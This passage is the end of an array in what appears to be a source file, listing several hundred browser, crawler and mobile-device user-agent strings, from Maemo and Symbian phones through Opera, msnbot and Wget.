	"Mozilla/5.0 (Maemo; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
	"Mozilla/5.0 (Maemo; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
	"Mozilla/5.0 (MeeGo; NokiaN950-00/00) AppleWebKit/534.13 (KHTML, like Gecko) NokiaBrowser/8.5.0 Mobile Safari/534.13",
	"Mozilla/5.0 (MeeGo; NokiaN9) AppleWebKit/534.13 (KHTML, like Gecko) NokiaBrowser/8.5.0 Mobile Safari/534.13",
	"Mozilla/5.0 (PLAYSTATION 3; 1.10)",
	"Mozilla/5.0 (PLAYSTATION 3; 2.00)",
	"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41",
	"Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaC6-01/011.010; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.7.2 3gpp-gba",
	"Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaC7-00/012.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.7.3 3gpp-gba",
	"Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaE6-00/021.002; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.16 Mobile Safari/533.4 3gpp-gba",
	"Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaE7-00/010.016; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.7.3 3gpp-gba",
	"Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaN8-00/014.002; Profile/MIDP-2.1 Configuration/CLDC-1.1; en-us) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.4 3gpp-gba",
	"Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaX7-00/021.004; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.21 Mobile Safari/533.4 3gpp-gba",
	"Mozilla/5.0 (SymbianOS/9.1; U; de) AppleWebKit/413 (KHTML, like Gecko) Safari/413",
	"Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413",
	"Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413 es50",
	"Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413 es65",
	"Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413 es70",
	"Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 Nokia5700/3.27; Profile/MIDP-2.0 Configuration/CLDC-1.1) AppleWebKit/413 (KHTML, like Gecko) Safari/413",
	"Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 Nokia6120c/3.70; Profile/MIDP-2.0 Configuration/CLDC-1.1) AppleWebKit/413 (KHTML, like Gecko) Safari/413",
	"Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaE90-1/07.24.0.3; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413 UP.Link/6.2.3.18.0",
	"Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95/10.0.018; Profile/MIDP-2.0 Configuration/CLDC-1.1) AppleWebKit/413 (KHTML, like Gecko) Safari/413 UP.Link/6.3.0.0.0",
	"Mozilla/5.0 (SymbianOS 9.4; Series60/5.0 NokiaN97-1/10.0.012; Profile/MIDP-2.1 Configuration/CLDC-1.1; en-us) AppleWebKit/525 (KHTML, like Gecko) WicKed/7.1.12344",
	"Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaN97-1/10.0.012; Profile/MIDP-2.1 Configuration/CLDC-1.1; en-us) AppleWebKit/525 (KHTML, like Gecko) WicKed/7.1.12344",
	"Mozilla/5.0 (SymbianOS/9.4; U; Series60/5.0 SonyEricssonP100/01; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 Safari/525",
	"Mozilla/5.0 (Unknown; U; UNIX BSD/SYSV system; C -) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.2",
	"Mozilla/5.0 (webOS/1.3; U; en-US) AppleWebKit/525.27.1 (KHTML, like Gecko) Version/1.0 Safari/525.27.1 Desktop/1.0",
	"Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
	"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
	"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
	"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
	"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
	"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1",
	"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
	"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6",
	"Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
	"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
	"Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)",
	"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9",
	"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8",
	"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)",
	"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )",
	"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1",
	"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14",
	"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5",
	"Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.5",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20",
	"Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a",
	"Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2",
	"Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0",
	"Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34",
	"Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1",
	"Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2",
	"Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	"Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
	"Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
	"Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ",
	"Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	"Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre",
	"Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0",
	"Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2",
	"Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0",
	"Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
	"Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre",
	"Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
	"Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2",
	"Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	"Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre",
	"Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0",
	"Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1",
	"Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0",
	"Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8",
	"Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0",
	"Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15",
	"Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko",
	"Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16",
	"Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025",
	"Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1",
	"Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020",
	"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1",
	"Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)",
	"Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher",
	"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian",
	"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8",
	"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15",
	"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8",
	"Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7",
	"Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.5",
	"Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14",
	"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)",
	"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6",
	"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)",
	"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11",
	"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)",
	"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0",
	"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2",
	"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330",
	"Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)",
	"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8",
	"Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0",
	"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)",
	"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9",
	"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15",
	"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",
	"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0",
	"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)",
	"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8",
	"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12",
	"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3",
	"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5",
	"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9",
	"Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12",
	"Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0",
	"Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15",
	"Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0",
	"Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3",
	"Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5",
	"Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8",
	"Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3",
	"Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6",
	"MSIE (MSIE 6.0; X11; Linux; i686) Opera 7.23",
	"msnbot/0.11 ( http://search.msn.com/msnbot.htm)",
	"msnbot/1.0 ( http://search.msn.com/msnbot.htm)",
	"msnbot/1.1 ( http://search.msn.com/msnbot.htm)",
	"msnbot-media/1.1 ( http://search.msn.com/msnbot.htm)",
	"NetSurf/1.2 (NetBSD; amd64)",
	"Nokia3230/2.0 (5.0614.0) SymbianOS/7.0s Series60/2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0",
	"Nokia6100/1.0 (04.01) Profile/MIDP-1.0 Configuration/CLDC-1.0",
	"Nokia6230/2.0 (04.44) Profile/MIDP-2.0 Configuration/CLDC-1.1",
	"Nokia6230i/2.0 (03.80) Profile/MIDP-2.0 Configuration/CLDC-1.1",
	"Nokia6630/1.0 (2.3.129) SymbianOS/8.0 Series60/2.6 Profile/MIDP-2.0 Configuration/CLDC-1.1",
	"Nokia6630/1.0 (2.39.15) SymbianOS/8.0 Series60/2.6 Profile/MIDP-2.0 Configuration/CLDC-1.1",
	"Nokia7250/1.0 (3.14) Profile/MIDP-1.0 Configuration/CLDC-1.0",
	"NokiaN70-1/5.0609.2.0.1 Series60/2.8 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.1.13.0",
	"NokiaN73-1/3.0649.0.0.1 Series60/3.0 Profile/MIDP2.0 Configuration/CLDC-1.1",
	"nook browser/1.0",
	"Offline Explorer/2.5",
	"Opera/10.61 (J2ME/MIDP; Opera Mini/5.1.21219/19.999; en-US; rv:1.9.3a5) WebKit/534.5 Presto/2.6.30",
	"Opera/7.50 (Windows ME; U) [en]",
	"Opera/7.50 (Windows XP; U)",
	"Opera/7.51 (Windows NT 5.1; U) [en]",
	"Opera/8.01 (J2ME/MIDP; Opera Mini/1.0.1479/HiFi; SonyEricsson P900; no; U; ssr)",
	"Opera/9.0 (Macintosh; PPC Mac OS X; U; en)",
	"Opera/9.20 (Macintosh; Intel Mac OS X; U; en)",
	"Opera/9.25 (Windows NT 6.0; U; en)",
	"Opera/9.30 (Nintendo Wii; U; ; 2047-7; en)",
	"Opera/9.51 Beta (Microsoft Windows; PPC; Opera Mobi/1718; U; en)",
	"Opera/9.5 (Microsoft Windows; PPC; Opera Mobi; U) SonyEricssonX1i/R2AA Profile/MIDP-2.0 Configuration/CLDC-1.1",
	"Opera/9.60 (J2ME/MIDP; Opera Mini/4.1.11320/608; U; en) Presto/2.2.0",
	"Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14320/554; U; cs) Presto/2.2.0",
	"Opera/9.64 (Macintosh; PPC Mac OS X; U; en) Presto/2.1.1",
	"Opera/9.64 (X11; Linux i686; U; Linux Mint; nb) Presto/2.1.1",
	"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.16823/1428; U; en) Presto/2.2.0",
	"Opera/9.80 (Macintosh; Intel Mac OS X 10.4.11; U; en) Presto/2.7.62 Version/11.00",
	"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52",
	"Opera/9.80 (Macintosh; Intel Mac OS X; U; en) Presto/2.6.30 Version/10.61",
	"Opera/9.80 (S60; SymbOS; Opera Mobi/499; U; ru) Presto/2.4.18 Version/10.00",
	"Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.7.39 Version/11.00",
	"Opera/9.80 (Windows NT 5.1; U; zh-tw) Presto/2.8.131 Version/11.10",
	"Opera/9.80 (Windows NT 5.2; U; en) Presto/2.2.15 Version/10.10",
	"Opera/9.80 (Windows NT 6.1; U; en) Presto/2.7.62 Version/11.01",
	"Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00",
	"Opera/9.80 (X11; Linux i686; U; en) Presto/2.2.15 Version/10.10",
	"Opera/9.80 (X11; Linux x86_64; U; pl) Presto/2.7.62 Version/11.00",
	"P3P Validator",
	"Peach/1.01 (Ubuntu 8.04 LTS; U; en)",
	"POLARIS/6.01(BREW 3.1.5;U;en-us;LG;LX265;POLARIS/6.01/WAP;)MMP/2.0 profile/MIDP-201 Configuration /CLDC-1.1",
	"POLARIS/6.01 (BREW 3.1.5; U; en-us; LG; LX265; POLARIS/6.01/WAP) MMP/2.0 profile/MIDP-2.1 Configuration/CLDC-1.1",
	"portalmmm/2.0 N410i(c20;TB) ",
	"Python-urllib/2.5",
	"SAMSUNG-S8000/S8000XXIF3 SHP/VPP/R5 Jasmine/1.0 Nextreaming SMM-MMS/1.2.0 profile/MIDP-2.1 configuration/CLDC-1.1 FirePHP/0.3",
	"SAMSUNG-SGH-A867/A867UCHJ3 SHP/VPP/R5 NetFront/35 SMM-MMS/1.2.0 profile/MIDP-2.0 configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
	"SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1;  http://www.google.com/bot.html)",
	"SearchExpress",
	"SEC-SGHE900/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 Opera/8.01 (J2ME/MIDP; Opera Mini/2.0.4509/1378; nl; U; ssr)",
	"SEC-SGHX210/1.0 UP.Link/6.3.1.13.0",
	"SEC-SGHX820/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
	"SonyEricssonK310iv/R4DA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.1.13.0",
	"SonyEricssonK550i/R1JD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
	"SonyEricssonK610i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
	"SonyEricssonK750i/R1CA Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
	"SonyEricssonK800i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
	"SonyEricssonK810i/R1KG Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
	"SonyEricssonS500i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
	"SonyEricssonT100/R101",
	"SonyEricssonT610/R201 Profile/MIDP-1.0 Configuration/CLDC-1.0",
	"SonyEricssonT650i/R7AA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
	"SonyEricssonT68/R201A",
	"SonyEricssonW580i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
	"SonyEricssonW660i/R6AD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
	"SonyEricssonW810i/R4EA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
	"SonyEricssonW850i/R1ED Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
	"SonyEricssonW950i/R100 Mozilla/4.0 (compatible; MSIE 6.0; Symbian OS; 323) Opera 8.60 [en-US]",
	"SonyEricssonW995/R1EA Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0",
	"SonyEricssonZ800/R1Y Browser/SEMC-Browser/4.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
	"SuperBot/4.4.0.60 (Windows XP)",
	"Uzbl (Webkit 1.3) (Linux i686 [i686])",
	"Vodafone/1.0/V802SE/SEJ001 Browser/SEMC-Browser/4.1",
	"W3C_Validator/1.305.2.12 libwww-perl/5.64",
	"W3C_Validator/1.654",
	"w3m/0.5.1",
	"WDG_Validator/1.6.2",
	"WebCopier v4.6",
	"Web Downloader/6.9",
	"WebZIP/3.5 (http://www.spidersoft.com)",
	"Wget/1.9.1",
	"Wget/1.9 cvs-stable (Red Hat modified)",
	"wii libnup/1.0"
];

